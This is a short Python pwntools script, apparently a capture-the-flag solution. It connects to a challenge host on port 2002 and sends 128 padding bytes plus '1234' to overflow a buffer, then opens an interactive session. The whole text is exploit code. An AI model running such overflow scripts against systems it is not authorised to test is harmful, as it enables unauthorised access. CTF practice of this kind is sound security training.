from pwn import *

p = remote("plzpwn.me",2002)
print p.recv()
p.sendline('a'*128 + '1234')
print p.recv()
p.interactive()
